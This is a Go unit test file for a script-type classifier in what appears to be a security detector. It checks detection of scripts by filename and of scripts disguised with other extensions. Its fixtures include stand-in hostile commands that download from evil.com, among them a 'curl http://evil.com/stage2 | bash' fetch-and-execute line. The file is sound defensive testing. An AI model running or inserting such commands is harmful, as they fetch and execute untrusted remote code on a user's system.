package detectors

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestClassifyByEnry(t *testing.T) {
	t.Parallel()

	tests := []struct {
		name         string
		filename     string
		content      []byte
		wantType     string
		wantLang     string
		wantMatched  bool
	}{
		// --- Filename-only detection (content is nil) ---
		{
			name:        "Python by filename",
			filename:    "/tmp/payload.py",
			content:     nil,
			wantType:    "python_script",
			wantLang:    "Python",
			wantMatched: true,
		},
		{
			name:        "JavaScript by filename",
			filename:    "/tmp/evil.js",
			content:     nil,
			wantType:    "javascript_script",
			wantLang:    "JavaScript",
			wantMatched: true,
		},
		{
			name:        "TypeScript by filename",
			filename:    "/tmp/module.ts",
			content:     nil,
			wantType:    "typescript_script",
			wantLang:    "TypeScript",
			wantMatched: true,
		},
		{
			name:        "Shell by filename",
			filename:    "/tmp/run.sh",
			content:     nil,
			wantType:    "bash_script",
			wantLang:    "Shell",
			wantMatched: true,
		},
		{
			name:        "Ruby by filename",
			filename:    "/tmp/exploit.rb",
			content:     nil,
			wantType:    "ruby_script",
			wantLang:    "Ruby",
			wantMatched: true,
		},
		{
			name:        "Perl by filename",
			filename:    "/tmp/script.pl",
			content:     nil,
			wantType:    "perl_script",
			wantLang:    "Perl",
			wantMatched: true,
		},
		{
			name:        "PowerShell by filename",
			filename:    "/tmp/backdoor.ps1",
			content:     nil,
			wantType:    "powershell_script",
			wantLang:    "PowerShell",
			wantMatched: true,
		},
		{
			name:        "PHP by filename",
			filename:    "/tmp/shell.php",
			content:     nil,
			wantType:    "php_script",
			wantLang:    "Hack", // go-enry classifies .php as Hack (PHP superset)
			wantMatched: true,
		},
		{
			name:        "Lua by filename",
			filename:    "/tmp/config.lua",
			content:     nil,
			wantType:    "lua_script",
			wantLang:    "Lua",
			wantMatched: true,
		},

		// --- Content-based detection (disguised filename) ---
		{
			name:     "Python content with non-Python extension",
			filename: "/tmp/data.dat",
			content: []byte(`#!/usr/bin/env python3
import os
import subprocess
subprocess.call(["curl", "http://evil.com/payload"])
`),
			wantType:    "python_script",
			wantLang:    "Python",
			wantMatched: true,
		},
		{
			name:     "JavaScript content with txt extension — enry prioritizes extension",
			filename: "/tmp/readme.txt",
			content: []byte(`const http = require('http');
const fs = require('fs');
http.get('http://evil.com/payload', (res) => {
    res.pipe(fs.createWriteStream('/tmp/dropped'));
});
`),
			// go-enry prioritizes the .txt extension → detects "Text"
			// which is in our ignoredLanguages, so no match.
			// This is acceptable: magic_write handler will still catch this
			// via classifyByContent (if shebang present) or extension fallback.
			wantType:    "",
			wantLang:    "",
			wantMatched: false,
		},
		{
			name:     "Shell content with no extension",
			filename: "/tmp/updater",
			content: []byte(`#!/bin/bash
curl http://evil.com/stage2 | bash
`),
			wantType:    "bash_script",
			wantLang:    "Shell",
			wantMatched: true,
		},

		// --- Edge cases ---
		{
			name:        "Empty content and unknown filename",
			filename:    "/tmp/mystery",
			content:     nil,
			wantType:    "",
			wantLang:    "",
			wantMatched: false,
		},
		{
			name:        "Binary gibberish content",
			filename:    "/tmp/blob",
			content:     []byte{0x00, 0xFF, 0xAB, 0xCD, 0xEF, 0x12, 0x34},
			wantType:    "",
			wantLang:    "",
			wantMatched: false,
		},
		{
			name:        "Empty filename with empty content",
			filename:    "",
			content:     nil,
			wantType:    "",
			wantLang:    "",
			wantMatched: false,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			gotType, gotLang, gotOK := classifyByEnry(tc.filename, tc.content)
			assert.Equal(t, tc.wantMatched, gotOK, "matched")
			assert.Equal(t, tc.wantType, gotType, "fileType")
			assert.Equal(t, tc.wantLang, gotLang, "language")
		})
	}
}
